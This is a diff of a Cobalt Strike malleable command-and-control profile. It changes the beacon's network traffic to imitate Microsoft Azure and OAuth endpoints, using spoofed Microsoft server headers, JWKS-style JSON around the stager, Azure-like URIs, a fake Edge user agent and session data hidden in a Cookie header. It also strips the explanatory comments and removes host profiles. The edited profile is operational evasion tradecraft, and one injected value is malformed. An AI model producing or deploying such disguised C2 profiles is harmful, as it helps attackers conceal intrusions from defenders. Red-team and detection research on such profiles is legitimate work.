@@ -65,18 +65,11 @@ dns-beacon {
 # Defaults for ALL CS set server responses
 
 http-config {
-    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
-    header "Server" "Apache";
-    header "Keep-Alive" "timeout=5, max=100";
-    header "Connection" "Keep-Alive";
+    set headers "Date, Server, Content-Length, Connection, Content-Type, x-ms-request-id, x-ms-correlation-id";
+    header "Server" "Microsoft-HTTPAPI/2.0";
+    header "Connection" "keep-alive";
 
-    # The set trust_x_forwarded_for option decides if Cobalt Strike uses the
-    # X-Forwarded-For set header to determine the remote address of a request.
-    # Use this option if your Cobalt Strike server is behind a redirector
     set trust_x_forwarded_for "true";
-
-    # Cobalt Strike's web server blocks requests from the Lynx, Wget, or Curl browser.
-    # This can be reconfigured with these options.
     set block_useragents "curl*,lynx*,wget*";
     set allow_useragents "";
 }
@@ -106,24 +99,20 @@ https-certificate {
 #    set digest_algorithm "SHA256";
 #}
 
-# Stager is only supported as a GET request and it will use AFAICT the IE on Windows.
 http-stager {
-    set uri_x86 "/api/v1/GetLicence";
-    set uri_x64 "/api/v2/GetLicence";
+    set uri_x86 "/common/discovery/keys";
+    set uri_x64 "/common/oauth2/v2.0/keys";
 
     client {
-        parameter "uuid" "96c5f1e1-067b-492e-a38b-4f6290369121";
-        #header "headername" "headervalue";
+        parameter "appid" "1950a258-227b-4e31";
     }
 
     server {
-        header "Content-Type" "application/octet-stream";
-        header "Content-Encoding" "gzip";
+        header "Content-Type" "application/json; charset=utf-8";
+        header "x-ms-request-id" "d7e4a3c0-5b2f-4e8a-9c1d";
         output {
-            #GZIP headers and footers
-            prepend "\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03";
-            append "\x7F\x01\xDD\xAF\x58\x52\x07\x00";
-            #AFAICT print is the only supported terminator
+            prepend "{\"keys\":[{\"kty\":\"RSA\",\"use\":\"sig\",\"kid\":\"";
+            append "\"}]}";
             print;
         }
     }
@@ -132,135 +121,79 @@ http-stager {
 # This is used only in http-get and http-post and not during stage
 set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0";
 
-# define indicators for an set GET
 http-get {
-    # we require a stub URI to attach the rest of our data to.
-    set uri "/api/v1/Updates";
+    set uri "/subscriptions/resources";
 
     client {
+        header "Accept" "application/json";
+        header "x-ms-version" "2024-05-01";
 
-        header "Accept-Encoding" "deflate, gzip;q=1.0, *;q=0.5";
-        # mask our metadata, base64 encode it, store it in the URI
         metadata {
-
-            # XOR encode the value
             mask;
-
-            # URL-safe Base64 Encode
-            base64;
-
-            # You probably want these to be last two, else you will encode these values
-
-            # Append a string to metadata
-            append ";" ;
-
-            # Prepend a string
-            prepend "SESSION=";
-            # Terminator statements - these say where the metadata goes
-
-            #Set in a header
+            base64url;
+            prepend "x-]]ms-client-session=";
             header "Cookie";
-
         }
     }
 
     server {
-        header "Content-Type" "application/octet-stream";
-        header "Content-Encoding" "gzip";
-        # prepend some text in case the GET is empty.
+        header "Content-Type" "application/json; charset=utf-8";
+        header "x-ms-request-id" "a1b2c3d4-e5f6-7890-abcd";
+        header "x-ms-correlation-id" "f0e1d2c3-b4a5-6789";
+
         output {
             mask;
             base64;
-            prepend "\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03";
-            append "\x7F\x01\xDD\xAF\x58\x52\x07\x00";
+            prepend "{\"value\":[{\"id\":\"/subscriptions/\",\"properties\":{\"data\":\"";
+            append "\"}}]}";
             print;
         }
     }
 }
 
-# define indicators for an set POST
 http-post {
-    set uri "/api/v1/Telemetry/Id/";
+    set uri "/api/operations";
     set verb "POST";
 
     set client_max_post_get_packet "4096";
 
     client {
-        # make it look like we're posting something cool.
-        header "Content-Type" "application/json";
-        header "Accept-Encoding" "deflate, gzip;q=1.0, *;q=0.5";
+        header "Content-Type" "application/json; charset=utf-8";
+        header "x-ms-version" "2024-05-01";
 
-        # ugh, our data has to go somewhere!
         output {
             mask;
             base64url;
             uri-append;
         }
 
-        # randomize and post our session ID
         id {
             mask;
             base64url;
-            prepend "{version: 1, d=\x22";
-            append "\x22}\n";
+            prepend "{\"operationId\":\"";
+            append "\",\"status\":\"InProgress\"}";
             print;
         }
     }
 
-    # The server's response to our set POST
     server {
-        header "Content-Type" "application/octet-stream";
-        header "Content-Encoding" "gzip";
+        header "Content-Type" "application/json; charset=utf-8";
+        header "x-ms-request-id" "b2c3d4e5-f6a7-8901-bcde";
 
         output {
             mask;
             base64;
-            prepend "\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03";
-            append "\x7F\x01\xDD\xAF\x58\x52\x07\x00";
+            prepend "{\"status\":\"Succeeded\",\"properties\":{\"output\":\"";
+            append "\"}}";
             print;
-        }
-    }
-}
-
-# HTTP Host Profiles
-# See: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_http-host-profiles.htm
-http-host-profiles {
-    profile {
-        set             host-name                   "one.ytrewq.com";
-        http-get {
-            set         uri                         "/[a|b|c|d]/ytrewq/get.js";
-            header      "ytrewq-header-[a|b|c]"     "static-value";
-            parameter   "ytrewq-parameter"          "value-[x|y|z]";
-            parameter   "ytrewq-[a|b|c]"            "value-[x|y|z]";
-            ## Example of param name that will be dropped when it resolves as blank
-            parameter   "[p1|||p4]"                 "[a|b|c]";
-        }
-        http-post {
-            set         uri   "/[a|b|c|d]/ytrewq/[post1|post2|post3|post4].js";
-            header      "ytrewq-header-[a|b|c]"     "static-value";
-            parameter   "ytrewq-parameter"          "value-[x|y|z]";
-            parameter   "ytrewq-[a|b|c]"            "value-[x|y|z]";
-            parameter   "[p1|||p4]"                 "[a|b|c]";
-        }
-    }
-    profile {
-        set             host-name        "two.ytrewq.com";
-        http-get {
-            set         uri              "/ytrewq/get/[2|two|dos]/[a|b|c].js";
-        }
-        http-post {
-            set         uri              "/ytrewq/post/[2|two|dos]/[a|b|c].js";
         }
     }
 }
 
 http-beacon {
-    # Use wininet or winhttp library? (default: wininet)
     set library "winhttp";
-
-    # send random data in all beacon check-in/callbacks (and how much?)
     set data_required "true";
-    set data_required_length "256-512";   # Random from 256 to 512
+    set data_required_length "256-512";
 }
 
 stage {
